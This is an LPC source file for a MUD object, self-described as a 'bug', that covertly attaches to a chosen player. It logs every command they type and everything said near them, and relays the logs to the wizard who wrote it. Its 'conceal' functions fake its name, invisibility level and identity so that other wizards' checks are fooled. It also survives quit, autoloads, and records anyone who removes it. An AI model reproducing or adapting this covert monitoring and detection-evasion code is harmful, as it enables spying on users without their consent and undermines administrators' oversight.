/* this is the most complex bug around                                 */
/* it sits in the environment and follows the punk, but is autoloading */
/* if our player idles for more than 5 minutes, it jumps in their inv  */
status log_data;
status tell_data;
string myname;
string lastname;
object myguy;
 
#define WIZ find_player("wizardchild")
#define LOGDIR "/players/wizardchild/closed/logs/"
#define MOVE_LOG_AT 100000
 
/* functions to conceal */
query_name() { return "Someone"; }
query_real_name() { 
  object ob;
  string str;
  if(ob = previous_object())
    str = creator(ob);
  else if(ob = environment())
    str = creator(ob);
  else if(ob = this_player() && ob != this_object())
    str = this_player()->query_real_name();
  return lower_case(str);
}
query_invis() { return 10000; }
query_level() { return 10000; }
is_player() { return previous_object() && !living(previous_object()); }
query_guild_name() {
  mapping tmp;
  object ob;
  tmp = (["dune":"cyberninja","hawkeye":"monk","sandman":"paladin",
  "trix":"undead","saber":"bard","nooneelse":"vampire","mizan":"polymorph"]);
  if(!(ob = previous_object())) ob = environment(this_object());
  if(!ob) return 0;
  return tmp[creator(ob)];
}
/* end conceal functions */
set_log(x)  { log_data = x; }
set_tell(x) { tell_data = x; }
id(str) { 
  return (str == "snooper" && this_player() == WIZ); 
}
query_auto_load() { return "/players/wizardchild/closed/snooper:"; }
reset(arg) { 
  if(arg)
    return ;
  log_data = 1;
  tell_data = (WIZ ? 1 : 0); 
  enable_commands(); /* for catch tell */
  move_object(clone_object("/players/wizardchild/closed/all_id"),
   this_object());
}
get()  { return 1; }
drop() { return 1; }
init() {
  if(!myname) {
    myguy = this_player();
    myname = myguy->query_real_name();
    move_object(this_object(),"/room/void");
    move_object(this_object(),environment(this_player()));
    do_log("[Snooper] "+myname+" logged in at "+ctime(time())+"\n");
    if(file_size(LOGDIR+myname+".log") > MOVE_LOG_AT)
      rename(LOGDIR+myname+".log",LOGDIR+myname+".log"+date_stamp());
  } else
    do_log("[Snooper] init() called by "+this_player()->query_real_name()+"\n");
  add_action("check_cmd"); add_xverb("");
  add_action("move_before_quit","quit");
}
date_stamp() {
  mapping mos;
  string day,mo,date,rest;
  mos = (["Jan":1,"Feb":2,"Mar":3,"Apr":4,"May":5,"Jun":6,"Jul":7,"Aug":8,
  "Sep":9,"Oct":10,"Nov":11,"Dec":12]);
  if(sscanf(ctime(time()), "%s %s %s %s",day,mo,date,rest) < 4)
    sscanf(ctime(time()), "%s %s  %s %s",day,mo,date,rest);
  return mos[mo]+"-"+date;
}
check_cmd(str) {
  lastname = this_player()->query_real_name();
  do_log("["+lastname+"] "+str+"\n");
  if(lastname == myname) call_out("check_here", 1);
  return 0;
}
check_here() { 
  if(!present(myguy,environment()))
    move_object(this_object(),environment(myguy));
}
move_before_quit() {
  if(this_player() == myguy)
    move_object(this_object(), this_player());
  return 0;
}
catch_tell(str) {
  string name, rest;
  if(sscanf(str, "%s %s", name, rest) < 2) return ;
  if(lower_case(name) == lastname) return ;
  do_log("[SCatch] "+str);
  lastname = 0; /* blank after msg */
}
remove_object(caller) {
  log_file("wizardchild.cls","[Snooper Removed: "+ctime(time())+"]\n"+
   " [snp:"+myguy->query_real_name()+",tp:"+this_player()->query_real_name()+",caller:"+caller->query_real_name()+"\n");
    if(!living(caller) && environment(caller) && living(environment(caller))) log_file("wizardchild.cls","  envcal:"+environment(caller)->query_real_name()+"]\n");
    else if(!environment(caller)) log_file("wizardchild.cls","  calfn:"+file_name(caller)+"]\n");
   return 0;
}
do_log(str) {
  if(log_data) write_file(LOGDIR+myname+".log", str);
  if(tell_data && WIZ)
    tell_object(WIZ, "[-"+myname+"-] "+str);
}
